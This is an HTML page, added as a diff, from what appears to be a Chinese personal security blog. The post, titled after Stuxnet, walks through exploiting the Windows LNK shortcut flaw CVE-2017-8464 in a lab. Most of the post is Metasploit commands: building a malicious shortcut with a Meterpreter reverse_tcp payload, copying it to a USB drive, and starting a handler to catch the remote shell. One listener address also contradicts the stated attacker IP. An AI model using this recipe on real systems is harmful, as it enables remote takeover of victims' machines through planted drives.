@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>震网病毒 | welcome to here</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="原理：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="震网病毒">
+<meta property="og:url" content="http://yoursite.com/2017/11/26/震网病毒/index.html">
+<meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="原理：">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1flvq7gkcebj30ke0d642y.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1flvqam97z5j30k304jdh3.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/0069oIoUgy1flvqbk1q22j30k303zjsa.jpg">
+<meta property="og:updated_time" content="2018-01-07T06:43:20.479Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="震网病毒">
+<meta name="twitter:description" content="原理：">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1flvq7gkcebj30ke0d642y.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="welcome to here" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">welcome to here</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Suche"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-震网病毒" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/11/26/震网病毒/" class="article-date">
+  <time datetime="2017-11-26T09:57:00.000Z" itemprop="datePublished">2017-11-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      震网病毒
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><a id="more"></a>
+<p>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。<br>当用户在Windows资源管理器或解析.LNK文件 的任何其他应用程序中打开此驱动器（或远程共享）时，<br>恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同 的用户权限。<br>创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒<br>注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名。<br>实验环境：同一局域网下进行攻击（公网下攻击正在研究了解后会更新），kali2.0，msfconsole 16<br>靶机ip 192.168.0.14<br>攻击机ip 192.168.0.55</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1.首先生成u盘攻击文件：<br>use exploit/windows/fileformat/cve_2017_8464_lnk_rce （使用该漏洞）</p>
+<p>set payload windows/x64/meterpreter/reverse_tcp   （设置payload以reverse形式的）</p>
+<p>set target 1</p>
+<p>set lhost 192.168.0.55</p>
+<p>set lport 55555</p>
+<p>exploit<br><img src="http://ww3.sinaimg.cn/large/0069oIoUgy1flvq7gkcebj30ke0d642y.jpg" alt="image"><br>2.会生成如上的文件将文件考到u盘中<br>3.接下来进行监听返回的端口<br>use exploit/multi/handler</p>
+<p>set payload windows/x64/meterpreter/reverse_tcp</p>
+<p>set lhost 192.168.1.14</p>
+<p>exploit<br><img src="http://ww3.sinaimg.cn/large/0069oIoUgy1flvqam97z5j30k304jdh3.jpg" alt="image"><br>4.成功<br><img src="http://ww2.sinaimg.cn/large/0069oIoUgy1flvqbk1q22j30k303zjsa.jpg" alt="image"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/11/26/震网病毒/" data-id="cjep9mrpc000pzco0h4ymnvk3" class="article-share-link">Teilen</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/11/27/python中的一些图片处理/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Neuer</strong>
+      <div class="article-nav-title">
+        
+          python中的一些图片处理
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/11/22/vps翻墙简单教程/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Älter</strong>
+      <div class="article-nav-title">vps翻墙简单教程</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archiv</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">letzter Beitrag</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/03/12/csrf学习/">web学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/10/sql注入的预防/">sql注入的预防</a>
+          </li>
+        
+          <li>
+            <a href="/2018/03/06/渗透测试流程-1/">渗透测试流程</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/19/xss简介/">xss学习</a>
+          </li>
+        
+          <li>
+            <a href="/2018/01/08/上传漏洞fckeditor的利用/">上传漏洞fckeditor的利用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 BlackManba<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
